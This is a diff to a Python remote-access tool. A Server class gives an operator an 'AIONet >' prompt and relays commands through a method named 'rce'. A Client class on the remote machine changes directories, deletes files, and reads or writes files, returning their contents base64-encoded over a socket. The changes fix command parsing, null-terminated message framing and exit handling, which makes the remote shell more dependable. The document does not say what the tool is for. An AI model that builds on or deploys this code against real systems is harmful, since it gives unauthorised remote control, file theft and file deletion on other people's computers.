@@ -30,7 +30,7 @@ class Server:
 		while True:
 			command = input("AIONet > ")
 
-			if command.count("upload") > 0:
+			if command[0:6] == "upload":
 				content = self.upload_file(command)
 				command = bytes(command, "utf-8") + b' ' + content + b'\n'
 			else:
@@ -39,7 +39,7 @@ class Server:
 			response = self.rce(command)
 
 			if type(command) is not bytes:
-				if command.count("download") > 0:
+				if command[0:8] == "download":
 					response = self.download_file(command, response)
 				
 			print(response)
@@ -70,16 +70,20 @@ class Server:
 		if command == "exit\n":
 			self.connection.close()
 			print("Exiting")
-			exit()
+			sys.exit(0)
 
-		response = ""
-		while True:
+		response = "\n"
+		#while True:
+		#	data = self.connection.recv(4096)
+		#	recv_len = len(data)
+		#	response += data.decode("utf-8")
+		#
+		#	if recv_len < 4096:
+		#		break
+
+		while response[-1] != "\x00":
 			data = self.connection.recv(4096)
-			recv_len = len(data)
 			response += data.decode("utf-8")
-
-			if recv_len < 4096:
-				break
 
 		return response
 
@@ -100,18 +104,18 @@ class Client:
 		new_dir = command.split(" ")[1]
 		try:
 			os.chdir(new_dir)
-			return f"Changed directory to {new_dir}"
+			return f"Changed directory to {new_dir}\n"
 		except Exception as e:
-			return f"Error changing directory: {str(e)}"
+			return f"Error changing directory: {str(e)}\n"
 
 
 	def remove_file(self, command):
 		to_remove = command.split(" ")[1]
 		try:
 			os.remove(to_remove)
-			return f"Removed {to_remove}"
+			return f"Removed {to_remove}\n"
 		except Exception as e:
-			return f"Error removing file: {str(e)}"
+			return f"Error removing file: {str(e)}\n"
 
 	
 	def run(self):
@@ -121,10 +125,11 @@ class Client:
 				command += self.connection.recv(4096).decode("utf-8")
 			command = command.rstrip()
 
+			result = ""
 			try:
 				if command == "exit":
 					self.connection.close()
-					exit()
+					sys.exit(0)
 				elif command[0:2] == "cd":
 					if len(command) > 3:
 						result = self.move_fs(command)
@@ -145,6 +150,11 @@ class Client:
 				result = f"Error: {str(e)}"
 
 			if type(result) is not bytes:
+				result += "\0"
+			else:
+				result += b"\0"
+
+			if type(result) is not bytes:
 				result = bytes(result, "utf-8")
 
 			self.connection.send(result)
@@ -153,7 +163,10 @@ class Client:
 	def read_file(self, command):
 		path = str(command).split(" ")[1].rstrip()
 		with open(path, "rb") as in_file:
-			return base64.b64encode(in_file.read())
+			content = in_file.read()
+			if type(content) is not bytes:
+				content = bytes(content, "utf-8")
+			return base64.b64encode(content)
 
 
 	def write_file(self, command):
@@ -197,4 +210,5 @@ if __name__ == "__main__":
 	try:
 		main()
 	except KeyboardInterrupt:
-		pass
+		print("Exiting")
+		sys.exit(0)
